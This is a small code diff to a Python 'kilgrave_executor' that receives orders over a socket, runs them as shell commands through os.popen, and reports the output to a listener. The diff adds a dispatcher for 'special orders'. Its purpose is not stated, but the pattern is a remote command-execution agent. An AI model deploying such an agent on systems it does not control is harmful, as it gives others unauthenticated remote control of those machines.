@@ -32,6 +32,12 @@ class kilgrave_executor():
     connection.send(execution_ack_string)
     return((order, disseminator_address))
 
+  def check_special_order(self, order):
+    if order in special_orders.keys():
+      special_orders[order](self.server_socket)
+      return True
+    return False
+
   def execute_order(self, order):
     # TODO(@akmodi): Change this to subprocess.
     order_output = os.popen(order).read()
@@ -55,6 +61,8 @@ def main():
   while (True):
     order, listener_address = executor_server.wait_for_order()
     print(order)
+    if executor_server.check_special_order(order):
+      continue
     order_output = executor_server.execute_order(order)
     executor_server.report_output(order_output, listener_address)
 
